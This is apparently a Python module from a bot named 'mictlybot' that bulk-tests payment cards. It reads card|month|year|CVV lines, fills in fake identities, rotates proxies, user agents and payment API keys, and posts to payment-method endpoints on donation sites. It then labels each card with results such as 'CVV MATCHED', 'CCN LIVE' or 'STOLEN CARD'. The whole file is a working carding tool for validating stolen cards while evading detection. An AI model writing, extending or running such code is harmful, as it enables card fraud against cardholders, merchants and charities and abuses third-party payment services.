"""Chequeo de tarjeta contra /v1/payment_methods usando perfiles de target."""

from __future__ import annotations

import argparse
import asyncio
import base64
import json
import re
import sys
import time
from collections.abc import Awaitable, Callable
from dataclasses import asdict, dataclass

import httpx

from .bincheck import BinCheckClient, BinError, BinInfo
from .cache import TTLCache
from .config import load_config
from .proxy import ProxyPool
from .targets import DEAD_KEY_MARKERS, KeyRing, Target, TargetRegistry
from .useragents import random_ua

IDENTITY_URL = "https://randomuser.me/api/?nat=us"

# (needle, kind, label) -- el orden importa, no reordenar
RULES: list[tuple[str, str, str]] = [
    ("known test card", "info", "TARJETA DE PRUEBA EN MODO LIVE"),
    ('"cvc_check": "pass"', "success", "CVV MATCHED"),
    ("Thank You For Donation.", "success", "CVV MATCHED"),
    ("Thank You.", "success", "CVV MATCHED"),
    ("Your card zip code is incorrect.", "success", "CVV MATCHED"),
    ("/donations/thank_you?donation_number=", "success", "CVV MATCHED"),
    ("incorrect_zip", "success", "CVV MATCHED - INCORRECT ZIP"),
    ('"type":"one-time"', "success", "CVV MATCHED - INCORRECT ZIP"),
    ("security code is incorrect.", "info", "CCN LIVE"),
    ("security code is invalid.", "info", "CCN LIVE"),
    ("Your card's security code is incorrect.", "info", "CCN LIVE"),
    ("incorrect_cvc", "info", "CCN LIVE"),
    ('"cvc_check": "fail"', "info", "CCN LIVE"),
    ("stolen_card", "info", "STOLEN CARD"),
    ("lost_card", "info", "LOST CARD"),
    ("Your card has insufficient funds.", "info", "INSUFFICIENT FUNDS"),
    ("insufficient_funds", "info", "INSUFFICIENT FUNDS"),
    ("pickup_card", "info", "PICKUP CARD"),
    ("Your card has expired.", "danger", "CARD EXPIRED"),
    ("expired_card", "danger", "CARD EXPIRED"),
    ("Your card number is incorrect.", "danger", "INCORRECT NUMBER"),
    ("incorrect_number", "danger", "INCORRECT NUMBER"),
    ("card was declined.", "danger", "CARD DECLINED"),
    ("generic_decline", "danger", "GENERIC DECLINE"),
    ("do_not_honor", "danger", "DO NOT HONOR"),
    (
        "Your card does not support this type of purchase.",
        "danger",
        "PURCHASE NOT SUPPORTED",
    ),
    ("transaction_not_allowed", "danger", "PURCHASE NOT SUPPORTED"),
    ("processing_error", "danger", "PROCESSING ERROR"),
    ("service_not_allowed", "danger", "SERVICE NOT ALLOWED"),
    ('"cvc_check": "unchecked"', "danger", "CVC UNCHECKED"),
    ('"cvc_check": "unavailable"', "danger", "CVC UNAVAILABLE"),
    ("parameter_invalid_empty", "danger", "MISSING CARD DETAILS"),
    ("lock_timeout", "danger", "REQUEST IN PROCESS"),
    ("three_d_secure_redirect", "danger", "3D SECURE REDIRECT"),
    (
        "Card is declined by your bank, please contact them for additional information.",
        "danger",
        "3D SECURE REDIRECT",
    ),
    ("missing_payment_information", "danger", "MISSING PAYMENT INFO"),
    (
        "Payment cannot be processed, missing credit card number",
        "danger",
        "MISSING CARD NUMBER",
    ),
    ('"object": "payment_method"', "info", "CCN LIVE"),
    ("-1", "danger", "UPDATE NONCE"),
]

CARD_RE = re.compile(r"^\d{12,19}$")

BinLookup = Callable[[str], Awaitable[BinInfo | None]]


@dataclass(slots=True)
class CardData:
    number: str
    month: str
    year: str
    cvc: str

    @classmethod
    def parse(cls, raw: str) -> CardData:
        raw = raw.strip().replace(" ", "")
        if "|" in raw:
            parts = [p.strip() for p in raw.split("|")]
        elif ":" in raw:
            parts = [p.strip() for p in raw.split(":")]
        else:
            parts = []
        if len(parts) == 3 and "/" in parts[1]:  # cc|mm/yy|cvv
            month, year = parts[1].split("/", 1)
            parts = [parts[0], month, year, parts[2]]
        if len(parts) != 4:
            raise ValueError("Formato: 4571736012345678|12|2028|123")
        number, month, year, cvc = parts
        if not CARD_RE.match(number):
            raise ValueError("El número debe tener entre 12 y 19 dígitos.")
        if not month.isdigit() or not year.isdigit() or not cvc.isdigit():
            raise ValueError("Mes, año y CVV deben ser numéricos.")
        if len(year) == 2:
            year = "20" + year
        return cls(number, month.zfill(2), year, cvc)

    @property
    def bin(self) -> str:
        return self.number[:6]

    @property
    def masked(self) -> str:
        return (
            f"{self.number[:6]}****{self.number[-4:]}"
            f"|{self.month}|{self.year}|{self.cvc}"
        )


@dataclass(slots=True)
class CheckResult:
    kind: str
    label: str
    bank: str = ""
    country: str = ""
    emoji: str = "🌐"
    card_type: str = ""
    prepaid: bool = False
    raw: str = ""
    ms: int = 0
    target: str = ""
    attempts: int = 1

    @property
    def ok(self) -> bool:
        return self.kind == "success"


def _slice(text: str, start: str, end: str) -> str:
    index = text.find(start)
    if index == -1:
        return ""
    index += len(start)
    stop = text.find(end, index)
    return text[index:stop].strip() if stop != -1 else text[index:].strip()


def _headers(target: Target, key: str) -> dict[str, str]:
    headers = {
        "accept": "application/json",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
        "content-type": "application/x-www-form-urlencoded",
        "origin": target.origin,
        "referer": target.referer,
        "user-agent": random_ua(),
    }
    if not key:
        return headers
    if target.auth == "bearer":
        headers["authorization"] = f"Bearer {key}"
    elif target.auth == "basic":
        token = base64.b64encode(f"{key}:".encode()).decode()
        headers["authorization"] = f"Basic {token}"
    return headers


def _payload(
    card: CardData, ident: dict[str, str], target: Target, key: str
) -> dict[str, str]:
    fields = target.fields
    data = {
        fields["type"]: "card",
        fields["number"]: card.number,
        fields["exp_month"]: card.month,
        fields["exp_year"]: card.year,
        fields["cvc"]: card.cvc,
        fields["name"]: (
            f'{ident.get("firstname", "")} {ident.get("lastname", "")}'.strip()
        ),
        fields["line1"]: ident.get("street", ""),
        fields["city"]: ident.get("city", ""),
        fields["state"]: ident.get("state", ""),
        fields["zip"]: ident.get("zip", ""),
        fields["country"]: "US",
        **target.extra,
    }
    if target.auth == "key" and key:  # solo la pk va en el body
        data["key"] = key
    return data


async def _identity(proxy: ProxyPool | None, timeout: float) -> dict[str, str]:
    proxy_url = proxy.random() if proxy else None
    try:
        async with httpx.AsyncClient(timeout=timeout, proxy=proxy_url) as client:
            text = (await client.get(IDENTITY_URL)).text
    except httpx.HTTPError:
        return {}
    return {
        "firstname": _slice(text, '"first":"', '"'),
        "lastname": _slice(text, '"last":"', '"'),
        "zip": _slice(text, '"postcode":', ","),
        "state": _slice(text, '"state":"', '"'),
        "city": _slice(text, '"city":"', '"'),
        "street": _slice(text, '"street":"', '"'),
    }


async def _post(
    card: CardData,
    ident: dict[str, str],
    target: Target,
    key: str,
    proxy: ProxyPool | None,
    timeout: float,
) -> tuple[str, int]:
    proxy_url = proxy.random() if proxy else None
    try:
        async with httpx.AsyncClient(
            timeout=timeout, proxy=proxy_url, follow_redirects=True
        ) as client:
            response = await client.post(
                target.endpoint,
                headers=_headers(target, key),
                data=_payload(card, ident, target, key),
            )
            return response.text, response.status_code
    except httpx.HTTPError as exc:
        return f"ERROR: {exc}", 0


def match_rules(raw: str, target: Target) -> tuple[str, str]:
    for needle in target.needles:  # marcadores propios del target primero
        if needle in raw:
            return "success", "CVV MATCHED"
    for needle, kind, label in RULES:
        if needle in raw:
            return kind, label
    return "unknown", "UNKNOWN ERROR"


async def check_card(
    card: CardData,
    *,
    target: Target,
    bin_lookup: BinLookup | None = None,
    proxy: ProxyPool | None = None,
    timeout: float = 30.0,
    use_identity: bool = True,
) -> CheckResult:
    if not target.has_key:
        return CheckResult(
            kind="dead", label="SIN CLAVE EN EL TARGET", target=target.name
        )

    ring = KeyRing(list(target.keys))
    started = time.perf_counter()

    ident_task = (
        _identity(proxy, timeout) if use_identity else asyncio.sleep(0, result={})
    )
    bin_task = bin_lookup(card.bin) if bin_lookup else asyncio.sleep(0, result=None)
    ident, bin_info = await asyncio.gather(ident_task, bin_task)

    raw = ""
    attempts = 0
    for _ in range(max(1, len(target.keys))):
        key = ring.current()
        if key is None:
            break
        attempts += 1
        raw, status = await _post(card, ident, target, key, proxy, timeout)

        if status == 429:
            await asyncio.sleep(1.0)
            continue

        if status == 401 or any(marker in raw for marker in DEAD_KEY_MARKERS):
            ring.mark_dead(key)
            if ring.rotate():
                continue
            return CheckResult(
                kind="dead",
                label="CLAVE REVOCADA",
                raw=raw,
                ms=int((time.perf_counter() - started) * 1000),
                target=target.name,
                attempts=attempts,
            )
        break

    kind, label = match_rules(raw, target)
    return CheckResult(
        kind=kind,
        label=label,
        bank=bin_info.bank if bin_info else "",
        country=bin_info.country if bin_info else "",
        emoji=bin_info.emoji if bin_info else "🌐",
        card_type=bin_info.card_type if bin_info else "",
        prepaid=bool(bin_info.prepaid) if bin_info else False,
        raw=raw,
        ms=int((time.perf_counter() - started) * 1000),
        target=target.name,
        attempts=attempts,
    )


async def check_many(
    lines: list[str],
    *,
    concurrency: int = 5,
    **kwargs,
) -> list[tuple[str, CheckResult | str]]:
    semaphore = asyncio.Semaphore(concurrency)

    async def one(line: str) -> tuple[str, CheckResult | str]:
        async with semaphore:
            try:
                return line, await check_card(CardData.parse(line), **kwargs)
            except ValueError as exc:
                return line, str(exc)

    return await asyncio.gather(*(one(line) for line in lines))


def _bin_client() -> BinCheckClient:
    config = load_config(require_token=False)
    return BinCheckClient(
        cache=TTLCache(config.cache_ttl_seconds),
        user_agent=config.user_agent,
    )


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="mictlybot.cardcheck")
    parser.add_argument("card", nargs="?", help="4571736012345678|12|2028|123")
    parser.add_argument("-f", "--file", help="archivo con una tarjeta por línea")
    parser.add_argument("-c", "--concurrency", type=int, default=5)
    parser.add_argument("-t", "--target", help="perfil de targets.toml")
    parser.add_argument("--list-targets", action="store_true")
    parser.add_argument("--json", action="store_true")
    parser.add_argument("--raw", action="store_true")
    parser.add_argument("--no-identity", action="store_true")
    args = parser.parse_args(argv)

    config = load_config(require_token=False)
    registry = TargetRegistry.from_config(config)

    if args.list_targets:
        for name in registry.names():
            print(name)
        return 0

    if not args.card and not args.file:
        parser.print_help()
        return 2

    try:
        target = registry.get(args.target)
    except Exception as exc:
        print(exc, file=sys.stderr)
        return 2

    if args.file:
        with open(args.file, encoding="utf-8") as handle:
            lines = [line.strip() for line in handle if line.strip()]
    else:
        lines = [args.card]

    bin_client = _bin_client()
    proxy = ProxyPool(config.proxy_file, config.use_proxy)

    async def run() -> list[tuple[str, CheckResult | str]]:
        async def lookup(bin_number: str) -> BinInfo | None:
            try:
                info, _ = await bin_client.lookup(bin_number)
                return info
            except BinError:
                return None

        try:
            return await check_many(
                lines,
                concurrency=args.concurrency,
                target=target,
                bin_lookup=lookup,
                proxy=proxy,
                timeout=config.http_timeout,
                use_identity=not args.no_identity,
            )
        finally:
            await bin_client.aclose()

    results = asyncio.run(run())

    for line, result in results:
        if isinstance(result, str):
            print(f"[ERR ] {line} -> {result}")
            continue
        if args.json:
            print(json.dumps({"card": line, **asdict(result)}, ensure_ascii=False))
            continue
        print(
            f"[{result.label:<28}] {line} -> "
            f"{result.bank or 'n/d'} [{result.country or '--'}] ({result.ms} ms)"
        )
        if args.raw:
            print(result.raw)
    return 0


if __name__ == "__main__":
    sys.exit(main())
